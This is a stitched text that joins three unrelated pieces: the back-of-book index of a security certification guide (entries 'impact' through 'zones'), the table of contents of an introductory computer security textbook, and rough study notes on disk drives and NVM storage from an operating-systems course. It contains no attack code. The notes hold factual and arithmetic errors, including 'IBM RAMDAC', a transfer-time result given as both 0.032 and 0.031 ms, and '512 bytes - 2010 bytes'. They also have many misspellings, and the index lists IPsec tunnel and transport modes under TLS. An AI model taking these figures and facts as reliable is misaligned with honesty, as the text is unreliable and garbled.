impact (risk assessment, registers), 347, 349, 350
impersonation, 279
implementation versus algorithm selection, 453 implicit deny, 158, 160, 162 improper certificate and key management, 458 improperly configured accounts (risk), 115
proper account management practices 115-122 incident response plan, 491-492
cyber-incident response teams, 491-492
reporting requirements/escalation, 492 roles and responsibilities, 492 incident response process, 492-493 containment, 493 eradication, 493 identification, 493
lessons learned, 493 preparation, 492
recovery, 493
incremental (backups), 402-403
industry-standard frameworks and reference architectures, 334 industry-specific frameworks, 334 national versus international, 334 non-regulatory, 334
regulatory, 334 infrared
detection (physical security), 389 facial recognition (biometrics), 106 mobile device connection, 245
infrastructure as code (Secure DevOps), 326 initial exploitation, 361 injection, 319, 320, 330, 331, 332
input handling 317, 319-321 insider (threat actor), 268 integer
overflow, 317
integrity measurement, 230-231
intermediate CA, 455
Internet Key Exchange, 143, 209 intranet (zone, topology), 163-165
intrusive (testing), 363
intrusive versus nonintrusive testing, 363 IoT, 252 IP spoofing, 305
ipconfig/ip/ifconfig (commands), 84-85
IPsec, 143, 209,
ACLs, 157-158
HMAC, 426
host-based firewalls, 160
NAT interoperability, 165
protocol numbers, 153 secure file transfer, 143 tunneling protocol (VPN), 209
iris scanner (biometric factor), 106 ISA (agreement type), 484 IV, 433
IV attack 205
J
jailbreaking (mobile device), 248 jamming, 204 job rotation (policies), 477 K
Kerberos (identity and access services), 110-111 key escrow (PKI concept), 460 key exchange asymmetric encryption, 439-440, 446
cipher suites, 452
Diffie-Hellman, 444
HTTPS transport encryption 450-452 Internet Key Exchange, 143, 209 key management certificate and key management, 458 physical security, 390 key strength, 429, 439
key stretching, 428-429 BCRYPT, 428
PBKDF2, 429
keylogger, 275
known plain text attack (and cipher text attack), 313-314 L
lack of vendor support (vulnerabilities), 239 LDAP (identity and access services), 111 LDAPS, 111-112, 145
least functionality, 226-227
least privilege, 116
group-based privileges, 124-125
onboarding, 480
permission auditing and review, 372 permission issues and access violations, 255
separation of duties, 476 technical control, 70
training and compliance issues, 502 legal and compliance (data issues), 489-490
legal hold (forensics), 499
license compliance violation (availability/ integrity), 233 lighting (physical security), 388 likelihood of occurrence, (risk assessment), 347, 349, 350 live boot media, 228
load balancer, 67, 169, 399-400
active-active (failover cluster), 398-399 active-passive (failover cluster), 398-399 scheduling, 399-400
affinity, 400
round-robin, 399
virtual IPs, 400
location-based policies (account management), 120
lock types (physical security), 384-386, 389-390 lockout (account policies), 102 logic bomb, 271-271 logs
access logs (physical security), 388 active logging (strategic intelligence
gathering), 500
events anomalies, 367-369
firewall, 368
network traffic and logs (forensics), 496 router, 368-369 WORM (SIEM), 371
M
MAC (access control model), 127-129
MAC filtering (wireless access point), 195-196 MAC spoofing, 305 machine/computer (certificate), 460 mail gateway (email), 171-172
DLP, 171
encryption, 172
spam filter 171
malware, 270-277
man-in-the-browser, 315
man-in-the-middle, 306-307 mandatory vacations (policies), 475
mantrap, 280, 386-387 master image, 229
MD5, 64-66, 111, 289, 311, 312, 352, 424, 425- 426
media gateway, 167
memory buffer vulnerabilities, 316-319 memory leak, 316-317 memory management, 316-319 MFD, 236
misconfiguration (vulnerability), 226-227 misconfigured devices access points, 207
content filter, 171
firewall, 162
mission-essential functions (BIA), 406 mitigate (risk response), 346-347 MMS (mobile device), 249
mobile device management concepts, 245-247 application management, 245 biometrics, 246 containerization, 246
content management, 246
context-aware authentication, 247 full device encryption, 245-246 geofencing, 247
geolocation, 247 passwords and pins, 246
push notification services, 247 remote wipe, 246 screen locks, 246
storage segmentation, 246
mobile devices, 243-250
model verification, 324 modes of operation, 435 motion detection (physical security), 73, 388- 389
MOU/MOA (agreement type), 484 MTBF 409
MTTR 409
MS-CHAP (identity and access services), 214 multifactor authentication, 97- 109
something you are, 106-107 something you do, 108 something you have, 103-105 something you know, 97-103 somewhere you are, 107-108
N
NAC, 211-213
agent versus agentless, 212-213
dissolvable versus permanent, 212-213 host health checks, 211-212 NAT (zone, topology), 165 nation state (threat actor), 269
national versus international (frameworks), 334 NDA (policies), 479 netcat (command), 367 netstat (command), 86
network access control, 211-213 network address allocation use case, 146 network mapping, 354 network scanners, 352-354
active reconnaissance, 360
network mapping, 354
rogue system detection, 355-356 zenmap, 353-354 network traffic and logs (forensics), 496 new threats and anti-malware, 288 and educating users, 291 and zero- day, 316 NFC
attack, 205
mobile device connection, 245 NIDS, 183-186
NIPS/NIDS Analytics, 186
false negative, 186 false positive, 186
anomaly-based detection, 184 data sources and trends, 185 heuristic/behavioral detection, 186 in- band versus out-of-band, 187 inline versus passive, 187
rules, 186
sensor and collector placement, 183-184 signature-based detection, 184 nmap (command), 366-367
non-persistence, 78
live boot media, 228
revert to known state, 77-78 rollback to known configuration, 78 snapshots, 77-78 non-regulatory (frameworks), 334
nonce, 214, 311, 433
nonintrusive (testing), 363
normalization, 328-330
nslookup (command), 149
NTLM (identity and access services), 111
O
OAUTH (identity and access services), 115 obfuscation code obfuscation (camouflage), 323 cryptography, 436
steganography, 64, 444-445
use case supporting obfuscation, 63, 64 object identifiers (OID), 456 OCSP, 459
off-site backups, 405
on-premise versus hosted versus cloud (cloud model), 239 onboarding/offboarding, 480
online versus offline (brute force attack), 310 online versus offline CA (PKI concept), 456 Open (wireless security method), 199-201 open-source intelligence, 268
OpenID Connect (identity and access services), 115 operating systems, 227-33
appliance, 228 application whitelisting/blacklisting, 233 disabling unnecessary ports and services,
227
kiosk, 228
least functionality, 226-227 mobile OS, 227
network, 228
secure configurations, 228-230 server, 227
disable
default accounts/passwords, 227
trusted operating system, 228 types, 227-228 workstation, 227 order of restoration
backups, 402-403
continuity of operations, 405 order of volatility, 494-495 organized crime (threat actor), 269 owner (data role and responsibilities), 490
P
P12 (certificate format), 462-463 P7B (certificate format), 462 PaaS, 240
PAP (identity and access services), 214 pass the hash, 311 passive reconnaissance, 360 passive versus active (tools), 363 passively testing security controls, 358 password
complexity, 97-99, 102 expiration (password policy), 99
history (password policy), 101-102 length, 97-98, 102
reuse, 101
password cracker, 352
rainbow table attacks, 312 vulnerability scanning, 357
wireless scanners/cracker, 354-355 passwords and pins (MDM),
246
patch management, 68, 231, 251
patch management tools, 231, 358 payment methods, (mobile device), 249 PBKDF2, 429 PEAP, 201
PEM (certificate format), 462 penetration testing, 359-363 penetration testing versus vulnerability
scanning, 363 perfect forward secrecy, 443
peripherals (secure systems design), 235-236 digital cameras, 236 displays, 235
external storage devices, 235-236 printers/MFDs, 236
Wi-Fi-enabled MicroSD cards, 236 wireless keyboards, 235 wireless mice, 235 permanent agent (NAC), 212-213
permission auditing and review, 372-373 permission issues, 255-257 persistence, 362
personal email (policies), 481
personnel issues (troubleshooting), 502-503 insider threat, 268
personal email, 475, 480 policy violation, 480 social engineering, 278-287
social media, 292, 481-483
training, 500-502
personnel management (policies), 474-483? acceptable use policy/rules of behavior, 475
adverse actions, 480 background checks, 479
clean desk, 477
continuing education, 501-502 exit interviews, 479-480
job rotation, 477
mandatory vacations, 475
NDA, 479
role-based awareness training, 500-501 data owner, 500
executive user, 501
privileged user, 501
system administrator, 500
system owner, 500-501
user, 501
separation of duties, 476 onboarding, 480
PFX (certificate format), 462-463 PGP/GPG, 450
PHI, 261, 485, 488-489
phishing, 281-284
physical (isolation, airgap), 166
physical (security control), 71-72, 383-395 physical access control (identity and access management) proximity cards, 384, 385, 386
smart cards, 385
physical security controls, 383-395 PII, 261, 485, 488-489
ping (command), 82-84 pinning (PKI concept), 459 PIV, 103-104
pivot (penetration testing), 361 PKI components CA, 454-456 intermediate CA, 455
CRL, 457-459
OCSP, 459
CSR, 456-457
certificate, 441-442
public key, 439-445
private key, 439-445
object identifiers (OID), 456 PKI concepts, 454- certificate chaining, 455-456 key escrow, 460
online versus offline CA, 456 pinning, 459 stapling, 459 trust model, 455-456
pointer dereference, 318-319 port security IEEE 802.1x, 191 MAC filtering, 195-196 switch (physical port) 155 ports
comparing ports and ports, 157
disabling unnecessary ports and services, 227 firewall rules, 150, 153 logical ports, 149-153
physical ports, 155
port security, 155
taps and port mirror, 183 power redundancies
preservation (of data, forensics), 495-498 preventive (security control), 72-73 principles (social engineering principles), 292- 295
authority, 293
intimidation, 293
consensus, 293
scarcity, 294
familiarity, 294
trust, 294-295
urgency, 294 printers/MFDs
secure systems design, 236 embedded systems, 250-251
privacy impact assessment (BIA), 407-408 privacy officer (data role and responsibilities), 490
privacy threshold assessment (BIA), 407-408 private (cloud model), 242
private key,
asymmetric encryption, 424, 432, 439-445
certificate formats, 462-463
digital signature, 425
email, 446-450
HTTPS, 450-452
improper certificate and key management, 458 key escrow, 460
Rayburn box, 441
recovery agent, 460 registration and CSRs, 456-457 revoking certificates, 457 smart cards,103 TPM, 238
privilege escalation, 117-118, 287, 304, 358, 361 privileged accounts, 117 proper error handling, 322
proper input validation, 319-321 protected distribution/protected cabling
(physical security), 394
protocol analyzer, 364-366
capture clear text, 110, 142, 311, 432 capture MAC and IP address, 497 connected to switch, 155 flood attack, 156 IDSs and IPSs, 182, 187 promiscuous mode, 85 protecting cabling, 394 sniffing attack, 140 tcpdump, 366
tracert command, 87
wireless attack, 195
WPA attack, 198
protocols (secure protocols), 140-149 DNSSEC, 148 FTPS, 143
HTTPS, 143, 145, 149 LDAPS, 111-112, 145 S/MIME, 450
secure POP/IMAP, 144-145
SFTP, 143 SNMPv3 SRTP, 142 SSH, 143
SSL/TLS, 143
provisioning and deprovisioning, 327 proximity cards, 207, 384, 385 tailgating and mantraps, 386-387 proxy 167-170 application/multipurpose, 169-170
forward proxy, 167-168
reverse proxy, 169
transparent, 168-169
pseudo-random number generation, 433, 434 PSK (wireless security method), 199-201 public (cloud model), 242
public key
asymmetric encryption, 424, 432, 439-445
certificate formats, 462-463
digital signature, 425
email, 446-450
HTTPS, 450-452
Rayburn box, 441
registration and CSRs, 456-457 smart cards,103 TPM, 238
public key infrastructure (PKI) 454-462 pulping (destruction and sanitization), 487 pulverizing (destruction and sanitization), 487 purging (destruction and sanitization), 487 push notification services (MDM), 247
Q
qualitative (risk assessment), 349 quantitative (risk assessment), 347- 349
R
race conditions, 321 RADIUS
identity and access services, 214-215 RADIUS Federation, 201 RAID (0, 1, 5, 6, 10), 396-397 rainbow table attack, 312-313 random number generation, 433, 434
ransomware, 274-275
RAT, 274 Rayburn box, 441
RC4, 438
recertification (account management), 121 record time offset (forensics), 497-498
recording microphone (mobile device), 249 recovery of data, forensics, 499 password recovery, 119
recovery sites, 409-410
cold site, 410
hot site, 409-410
warm site, 410
redundancy, 67
disk redundancies, 396-397
power redundancies, 400
server redundancy, 397 refactoring, driver manipulation, 315-316 regulatory (frameworks), 334 remote access
use case, 145-146
VPNs, 207-211
remote attestation, 237 remote wipe (MDM), 246
removable media control (DLP), 257-258 replay attack, 110, 142, 206-207, 313 resource exhaustion (vulnerability), 270 retinal scanner (biometric factor), 107 reverse proxy, 169 revert to known state (snapshot, virtualization), 77-78 RFID attack, 206-207
RIPEMD, 427
risk assessment, 346-350
risk register, (risk assessment), 350, 351 risk response techniques, 346-347 accept, 347 avoid, 346
mitigate, 346-347
transfer, 346
role-based access control, 122-125
role-based awareness training (policies), 500- 501
data owner, 500
executive user, 501
privileged user, 501
system administrator, 500
system owner, 500-501
user, 501
rollback to known configuration (snapshot, virtualization), 78
rogue AP, 203
rogue system detection, 355-356 root (certificate), 455-456 rooting (mobile device), 248 rootkit, 277 ROT13, 436
round-robin (load balancing, scheduler), 399 router 147, 154, 156-158
ACLs 141, 157-158
aggregation switch, 160
antispoofing, 158
attribute-based access control, 129 Layer 3 switch (comparison), 166
logs, 368-369 NAT and PAT, 165
physical security, 383, 390
ping (blocked), 84
ports, 141, 150-153
rule-based access control, 126 NIDS (sensors), 183
SDN (comparison), 189-190 separation and segmentation, 166 TACACS+, 215-216 tracert (command), 87
use cases, 172
wireless, 192-193,
SNMP, 172
routing and switching use case, 172 RPO, 408 RSA, 443
RTO, 408
RTOS, 253
rule-based access control, 126
S
S/MIME, 450
SaaS, 240
safe (physical security), 390
SAML (identity and access services), 114 SAN (certificate), 461 sandboxing chroot, 234
code quality and testing, 324 secure staging & deployment, 234
salt
and key stretching, 428-429
and rainbow table attacks, 312-313 SATCOM (mobile device connection), 244 SCADA, 252
scalability, 75, 398, 399
scanners/cracker (wireless), 354-355
scheduling, 399-400
screen filter, 279
screen locks (MDM), 246 screenshots (forensics), 498 script kiddie (threat actor), 268 SDN, 129, 189-190
secret algorithm, 433
secure baseline, 230-231
secure boot (and attestation), 237 secure cabinets/enclosures (physical security), secure coding techniques, 319- 327 Secure DevOps, 324-327
continuous integration, 325
baselining, 325-326
immutable systems, 326 infrastructure as code, 326 security automation, 325
secure POP/IMAP, 144-145
secure token (identity and access services), 112 Security as a Service, 241-242 security automation (Secure DevOps), 325 security control types, 69-75
administrative, 70-71
compensating, 74-75
corrective, 74
deterrent, 74
detection versus prevention controls, 74 detective,73 physical, 71-72, 383-395 preventive, 72-73
technical, 70
security device/technology placement collectors, 183-184 DDoS mitigator, 171
filters, 167-168, 170-171
firewalls, 160-165
load balancers, 399
proxies, 167-168
sensors, 183-184
SSL (TLS) accelerators, 188-189 taps and port mirror, 183
VPN concentrator, 208
security guards (physical security), 387 security through obscurity, 64, 323, 436 SED (hardware/ firmware security), 237
segregation/segmentation/isolation (secure network) logical (network, VLAN), 166 physical (airgap), 166 router, 166
switch (use case) 172 virtualization, 77
VLAN, 167
self-signed (certificate), 461 separation of duties (policies), 476 server-side versus client-side execution and validation, 320-321
server redundancy, 397
service accounts, 117
service attack, 140, 304
session hijacking, 314
session keys (symmetric encryption) 435, 439,
450, 452
SFTP, 143
SHA, 64-66, 311, 312, 424, 426
shared and generic accounts/credentials, 118 Shibboleth (identity and access services), 115 shielding (physical security), 394-395 shimming, driver manipulation, 315
shoulder surfing, 279
shredding (destruction and sanitization), 487 sideloading (mobile device), 248
SIEM, 370-373 aggregation, 370
automated alerting and triggers, 370 correlation, 370 event deduplication371 logs/WORM, 371 time synchronization, 370-371 signal strength (wireless access point), 197 signs (physical security), 384
single point of failure, 395-396, 396-401
single sign-on (SSO), 112-115, 200
site-to-site (VPN), 210
SLA (agreement type), 484 SLE (risk assessment), 348 smart cards, 103
smart devices/IoT (embedded systems), 252 home automation, 252 wearable technology, 252 SMS (mobile device), 249 snapshots
backups, 403
virtualization, 77-78
SNMP, 156, 172
SoC, 252
social media networks/applications (policies), 481-482
social engineering, 278-287 something you are, 106-107 something you do, 108 something you have, 103-105 something you know, 97- 103 somewhere you are, 107-108 spear phishing, 284 special purpose (embedded system), 253-254 aircraft/UAV, 254 medical devices, 253-254 vehicles, 253-254
split tunnel versus full tunnel (VPN), 209-210 spyware, 275 SQL injection 320, 330-332
SRTP, 142
SSH, 143, 145-146, 151, 207, 310, 362, 367
SSID (wireless access point), 194-195 SSL SSL versus TLS, 144, 450-451
weak/deprecated algorithms, 434
SSL/TLS accelerators, 188-189
SSL decryptors, 189
standard naming convention (account management), 118 standard operating procedure, 474 stapling (PKI concept), 459 STARTTLS, 143, 144
stateful versus stateless (firewall), 141, 162 stateless firewall rules, 162 static code analyzers, 324 steganography, 64. 372, 425, 444-445
steganography tools 444-445 steward/custodian (data role and responsibilities), 490
storage segmentation (MDM), 246
stored procedures, 331-332
strategic intelligence/counterintelligence gathering, 500 active logging, 500
stream versus block (cipher mode), 434 stress testing, 324 substitution cipher, 436 subscription services use case, 149
supply chain (hardware/firmware security), 236 supply chain assessment (risk assessment), 351 switch, 154-156 flood guard, 156
Layer 2 versus Layer 3, 166
loop prevention, 155-156
port security, 155
symmetric algorithms, 435-439
3DES, 438
AES, 437-438
Blowfish/Twofish, 438-439
DES, 438
RC4, 438
system sprawl and undocumented assets (vulnerability), 391
T
tabletop exercise, 412
TACACS+ (identity and access services), 215-216 take hashes (forensics), 496 tailgating, 280, 386-387
tcpdump (command), 366 technical (security control), 70 templates, 230
testing
penetration testing authorization, 359 vulnerability testing authorization, 359
tethering (mobile device), 250
third-party app stores (mobile device), 248 third-party libraries and SDKs, 323
threat actors (types and attributes), 268-270, 344-345 threat assessment, 344-345 environmental, 345
internal versus external, 345 manmade, 345
time-of-day restrictions (account management), 120
time synchronization Kerberos, 110 SIEM, 370-371
use case, 146
TKIP, 199, 201, 202, 206, 207 TLS AH, 209
certificate, 456
cipher suites, 452-453
downgrade attack, 453-454
EAP-Tunneled TLS, 201
EAP-TLS, 201
ESP, 209
HMAC, 426
HTTPS, 145, 450-452
LDAPS, 112, 144
PEAP, 201
secure file transfer, 143 secure IMAP, 144 SSL/TLS accelerators, 188-189 SSL decryptors, 189 Tunnel mode, 209
tunneling protocol (VPN), 209 Transport mode, 209 tokens, 104-1505
hardware (key fob), 104
software (in a software application), 105 tokens/cards (physical security), 385
TOTP, 104-105
TPM (hardware/firmware security), 237-238 tracert (command), 87-88 track man-hours (forensics), 500 transfer (risk response), 346 transitive trust, 113
transparent (proxy), 168-169 Transport mode (TLS), 209 Trojan, 273
trust model (PKI concept), 455-456 trusted operating system, 228 Tunnel mode (TLS), 209 tunneling/VPN, 209-210
remote access, 208-211
site-to-site, 210
tunneling protocol (TLS for VPN), 209 Twofish, 438-439 Type I (hypervisor), 76
Type II (hypervisor), 76 typo squatting, 314
U
UAV, 254
UEFI (hardware/firmware security), 237 unauthorized software, 233 unencrypted credentials/ clear text, 110, 364-365 unified threat management (UTM), 170-171 untrained users (vulnerability), 291
URL hijacking, 314
usage auditing and review, 371-372 USB (mobile device connection), 245 USB OTG (mobile device), 249
UTM, 170-171
use case 62-63, 142-146
directory services, 145
domain name resolution, 147-149 email and web, 144-145 file transfer, 142-143
high resiliency, 434
low latency, 459
low power devices, 444 network address allocation, 146 protocols, 141-149
remote access, 145-146
resource versus security constraints, 68 routing and switching, 172 time synchronization,146 subscription services, 149
supporting authentication, 97
supporting confidentiality, 63
supporting integrity, 64
supporting non-repudiation, 66
supporting obfuscation, 64 voice and video, 142 user (certificate), 460
V
VDI (mobile device deployment model), 244 VDI/VDE (virtual desktops), 78 vendor diversity (defense-in-depth), 383 version control and change management, 326 virtual IPs (load balancing), 400
virtualization, 75-80 viruses, 271
vishing, 285
VLAN (isolating traffic), 166 VM escape protection, 79 VM sprawl avoidance, 79
voice and video use case, 142
voice recognition (biometric factor), 106 VPN concentrator, 208 always-on VPN, 211
IPsec, 209
AH, 209
ESP, 209
Tunnel mode, 209
Transport mode, 209
remote access versus site-to-site, 207, 208, 210-211 split tunnel versus full tunnel, 209-210 TLS, 209
vulnerability scanner, 351, 356-358
active reconnaissance, 360 configuration compliance scanner, 359 credentialed versus non- credentialed,
358
integrity measurements for baseline deviation, 231
passive versus active tools, 363 vulnerability scanning, 356-358 vulnerable business processes, 406
W
waterfall (software development life-cycle model), 324-325 watering hole attack, 280-281 warm site, 410 weak/deprecated algorithms, 434
weak cipher suites (vulnerability, downgrade attack), 453-454
weak configuration (vulnerability), 226-227 weak implementations (downgrade attack), 453-454
weak security configurations, 226, 230-231
wearable technology, 252
web application firewall, 163 whaling, 284
white box, 362
whitelist, whitelisting, 233, 245 Wi-Fi direct (mobile device), 250 Wi-Fi (mobile device connection), 244
Wi-Fi-enabled MicroSD cards (secure systems design), 236 wildcard (certificate), 461
wiping (destruction and sanitization), 486 wireless attacks, 202-207
keyboards (secure systems design), 235 mice (secure systems design), 235 scanners/cracker, 354-355
security, 192-202
zone, topology, 198 wireless security methods PSK versus Enterprise versus Open, 199- 201 WPS, 203
captive portals, 202 witness interviews (forensics), 498 WPA/ WPA2, 198, 199, 200-201, 202, 203, 206
WPS, 203 X
XOR, 433, 435
Z
zenmap, 353-354
zero day, 185, 190, 253, 289, 292, 316 zones/topologies, 163-165, 198
ad hoc, 198
DMZ, 163-165
extranet, 163-165
guest, 198
honeynets, 190
intranet, 163-165
NAT, 165 # Introduction to Computer Security
 .
.
.
.
1. Introduction
1 Fundamental Concepts
. 1.1 Confidentiality, Integrity, and Availability
. 1.2 Assurance, Authenticity, and Anonymity
. 1.3 Threats and Attacks
. 1.4 Security Principles
2 Access Control Models
. 2.1 Access Control Matrices
. 2.2 Access Control Lists
. 2.3 Capabilities
. 2.4 Role-Based Access Control
3 Cryptographic Concepts
. 3.1 Encryption
. 3.2 Digital Signatures
. 3.3 Simple Attacks on Cryptosystems
. 3.4 Cryptographic Hash Functions
. 3.5 Digital Certificates
4 Implementation and Usability Issues
. 4.1 Efficiency and Usability
. 4.2 Passwords . 4.3 Social Engineering
. 4.4 Vulnerabilities from Programming Errors
. 5 Exercises .
2. Physical Security
. 1 Physical Protections and Attacks
. 2 Locks and Safes
. 2.1 Lock Technology
. 2.2 Attacks on Locks and Safes
. 2.3 The Mathematics of Lock Security
. 3 Authentication Technologies
3.1 3.2 3.3 3.4 3 5.
Barcodes
Magnetic Stripe Cards Smart Cards RFIDs
Biometrics
. 4
. 5
. 6
. 7
Direct Attacks Against Computers
. 4.1 Environmental Attacks and Accidents
. 4.2 Eavesdropping
. 4.3 TEMPEST
. 4.4 Live CDs
. 4.5 Computer Forensics
Special-Purpose Machines
. 5.1 Automated Teller Machines
. 5.2 Voting Machines
Physical Intrusion Detection
. 6.1 Video Monitoring
. 6.2 Human Factors and Social Engineering
Exercises .
. .
.
.
.
.
3. Operating Systems Security
1 Operating Systems Concepts
. 1.1 The Kernel and Input/Output
. 1.2 Processes
. 1.3 The Filesystem
. 1.4 Memory Management
. 1.5 Virtual Machines
2 Process Security
. 2.1 Inductive Trust from Start to Finish
. 2.2 Monitoring, Management, and Logging
3 Memory and Filesystem Security
. 3.1 Virtual Memory Security
. 3.2 Password-Based Authentication
. 3.3 Access Control and Advanced File Permissions
. 3.4 File Descriptors
. 3.5 Symbolic Links and Shortcuts
4 Application Program Security
. 4.1 Compiling and Linking
. 4.2 Simple Buffer Overflow Attacks
. 4.3 Stack-Based Buffer Overflow
. 4.4 Heap-Based Buffer Overflow Attacks
. 4.5 Format String Attacks
. 4.6 Race Conditions
5 Exercises
4. Malware
1 Insider Attacks
. 1.1 Backdoors
. 1.2 Logic Bombs
. 1.3 Defenses Against Insider Attacks 2 Computer Viruses
. 2.1 Virus Classification . 2.2 Defenses Against Viruses
. 2.3 Encrypted Viruses
. 2.4 Polymorphic and Metamorphic Viruses
. 3 Malware Attacks
. 3.1 Trojan Horses
. 3.2 Computer Worms
. 3.3 Rootkits
. 3.4 Zero-Day Attacks
. 3.5 Botnets
. 4 Privacy-Invasive Software 4.1 Adware
4.2 Spyware
. 5 Countermeasures
. 5.1 Best Practices
. 5.2 The Impossibility of Detecting All Malware
. 5.3 The Malware Detection Arms Race
. 5.4 Economics of Malware
. 6 Exercises
5. Network Security I
. 1 Network Security Concepts
. 1.1 Network Topology
. 1.2 Internet Protocol Layers
. 1.3 Network Security Issues
. 2 The Link Layer 2.1 Ethernet
. 2.2 Media Access Control (MAC) Addresses . 3
. 2.3 ARP Spoofing
The Network Layer . 3.1IP
. 3.2 Internet Control Message Protocol . 3.3 IP Spoofing
. 3.4 Packet Sniffing
The Transport Layer
. 4.1 Transmission Control Protocol (TCP)
. 4.2 User Datagram Protocol (UDP)
. 4.3 Network Address Translation (NAT) . 4.4 TCP Session Hijacking
Denial-of-Service Attacks
. 5.1 ICMP Attacks
. 5.2 SYN Flood Attacks
. 5.3 Optimistic TCP ACK Attack
. 5.4 Distributed Denial-of-Service
. 5.5 IP Traceback
Exercises
. 4
. 5
. 6

6. Network Security II
1 The Application Layer and DNS
. 1.1 A Sample of Application-Layer Protocols . 1.2 The Domain Name System (DNS)
. 1.3 DNS Attacks
. 1.4 DNSSEC
. 2
. 3
. 4
Firewalls
. 2.1 Firewall Policies
. 2.2 Stateless and Stateful Firewalls
Tunneling
. 3.1 Secure Shell (SSH)
. 3.2 IPsec
. 3.3 Virtual Private Networking (VPN)
Intrusion Detection
. 4.1 Intrusion Detection Events
. 4.2 Rule-Based Intrusion Detection
. 4.3 Statistical Intrusion Detection
. 4.4 Port Scanning
. 4.5 Honeypots
Wireless Networking
. 5.1 Wireless Technologies
. 5.2 Wired Equivalent Privacy (WEP)
. 5.3 Wi-Fi Protected Access (WPA)
Exercises
. 5
. 6 7. Web Security
8. Cryptography
9. Distributed-Applications Security 10. Bibliography ^ operating-system-concepts 536
536OS: chapter11 Mass-Storage Systems
Storage system secondary storage.
  - main mass-storage system
  - provided by hard disk drives (HDD) and nonvolatile memory (NVM)
devices.
tertiary storage (slower, larger)
  - magnetic tape, optical disks, or even cloud storage).
The most common and important storage devices are HDDs and NVM devices.
We first describe their physical structure.
then consider scheduling algorithms: schedule the order of I/Os to maximize
performance.
Next, discuss device formatting and management of boot blocks, damaged blocks,
and swap space.
Finally, examine the structure of RAID systems.
536chapter11.1 Overview of Mass-Storage Structure HDDs and nonvolatile memory devices NVM devices.
OS translate physical properties to logical storage via address mapping.
536chapter11.1.1 Hard Disk Drives
HDDs are relatively simple.
Each disk platter has a flat circular shape, like CD. Commonly diameters 3.5”, 2.5” and 1.8”.
Storyge range from 30 GB to 3TB per drive.
The two surfaces of a platter are covered with a magnetic material. store information: record magnetically on platters.
read information: detecte the magnetic pattern on the platters.   A read–write head “flies” just above each surface of every platter. The heads are attached to a disk arm that moves all the heads as a unit.
The surface of a platter:
logically divided into circular tracks, subdivided into sectors. The set of tracks at a given arm position: make up a cylinder.
  - thousands of concentric cylinders in a disk drive,
  - each track may contain hundreds of sectors.
Each sector: fixed size, the smallest unit of transfer, commonly 512 bytes - 2010
bytes.
At that point, many manufacturers start migrating to 4KB sectors. The storage capacity of disk drives is measured in gigabytes and terabytes. Hard Disk Performance
A disk drive motor spins at high speed.
Rotations per minute (RPM): usually rotate 60 - 250 times/second, 5,400, 7,200, 10,000, and 15,000 RPM.
Some drives power down when not in use, spin up upon receiving an I/O request. DISK TRANSFER RATES:
  - Transfer rates always > effective treansfer rates
  - Transfer rate (theoretical): the rate that data flow between the drive and the computer. (bits can be read from the magnetic media by the disk head). Rotation speed relates to transfer rates. (6Gb/s)
  - Effective treansfer rates (real): the rate at which blocks are delivered to the operating system. (1Gb/s)
Positioning time / random-access time = seek time + rotational latency.
  - seek time: time to move disk arm to desired cylinder.
  - (3ms-12ms), 9ms common for desktop drives.
  - Average seek time measured or calculated based on 1/3 of
tracks.
  - rotational latency: time for desired sector to rotate under the disk head.
  - Latency based on spindle speed. 1 / (RPM / 60) = 60 / RPM.    - Average latency = 1⁄2 latency.
  - Typical disks can transfer tens-hundreds megabytes of data per second,
and they have seek times and rotational latencies of several milliseconds.
They increase performance by having DRAM buffers in the drive controller.
The disk head flies on an extremely thin cushion (measured in microns) of air or another gas, such as helium 氦, and there is a danger that the head will make contact with the disk surface.
head crash: Although the disk platters are coated with a thin protective layer, the head will sometimes damage the magnetic surface.
  - normally cannot be repaired; entire disk must be replaced, the data on the disk are lost .
Access Latency = Average access time = average seek time + average latency For fastest disk 3ms + 2ms = 5ms
For slow disk 9ms + 5.56ms = 14.56ms
Transfer time = (amount to transfer / transfer rate)
Average I/O time = average access time + Transfer time + controller overhead
example to transfer a 4KB block on a 7200 RPM disk with a 5ms average seek time, 1Gbps transfer rate with a 0.1ms controller overhead:
Transfer time = (amount to transfer / transfer rate)
  - = 4 x 210 bytes x 8 / (1x109 bits/1 second)
  - = 4x1024x8/10^9
  - = 32768/10^9
  - = 32768 x 10-9 = 0.032 x 10-3 = 0.031 ms
Average I/O time for 4KB block:
= average access time + Transfer time + controller overhead
= average seek time + average latency + Transfer time + controller overhead = 5ms + 4.17ms + 031ms + 0.1ms = 9.301ms
HDDs:
sealed units:
  - some chassis that hold HDDs allow their removal without shutting down the system or storage chassis.
  - helpful when a system needs more storage than can be connected at a given time or when it is necessary to replace a bad drive with a working one.
removable units: CDs, DVDs, and Blu-ray discs.
Drive attached to computer via I/O bus
Busses vary, including EIDE, ATA, SATA, USB, Fibre Channel, SCSI,
SAS, Firewire.
Host controller in computer uses bus to talk to disk controller built in drive
or storage array
The First Commercial Disk Drive
1956, IBM RAMDAC computer included the IBM Model 350 disk storage system. 5M (7 bit) characters
50 x 24” platters
Access time = < 1 second  536chapter11.1.2 Nonvolatile Memory Devices electrical rather than mechanical.
Commonly composed of a controller and flash NAND die semiconductor chips (used to store data)
Other NVM technologies exist, like DRAM with battery backing so it doesn’t lose its contents,
Other semiconductor technology like 3D XPoint, but they are far less common.
11.1.2.1 Overview of Nonvolatile Memory Devices
Flash-memory-based NVM:
frequently used in a disk-drive-like container, SSD (solid-state disk).
In form of a USB drive (thumb drive or flash drive) or a DRAM stick.
It is also surface-mounted onto motherboards as the main storage in devices like smartphones.
In all forms, it acts and can be treated in the same way.  NVM devices can be more reliable than HDDs: Benifit:
  - have no moving parts, much faster (no seek time or rotational latency),
  - consume less power.
  - More reliable then HDDs.
Negative side:
  - more expensive per megabyte than traditional hard disks
  - have less capacity than the larger hard disks.
  - Maybe have shorter life span.
But the capacity of NVM devices has increased faster, and their price has dropped more quickly, so their use is increasing dramatically.
SSDs and similar devices are now used in some laptop computers to make them
smaller, faster, and more energy-efficient.
Because NVM devices can be much faster than HDD:
standard bus interfaces can cause a major limit on throughput. Too slow.
Some NVM devices can connect directly to the system bus (PCIe, example). This technology is changing other traditional aspects of computer design as well.
Some systems use it as a direct replacement for disk drives, while others use it as a new cache tier (moving data among magnetic disks - NVM - main memory to optimize performance).
NAND semiconductors ???
NAND semiconductors have some characteristics that present their own storage and reliability challenges.
 a type of nonvolatile storage technology that does not require power to retain data.
Example, they can be read and written in a “page” increment (like sector), but data cannot be overwritten— rather, the NAND cells have to be erased first.
The erasure, occurs in a “block” increment (several pages in size), spead: read > write > much faster than erase.
  - Helping the situation is that NVM flash devices are composed of many die, with many datapaths to each die, so operations can happen in parallel (each using a datapath).
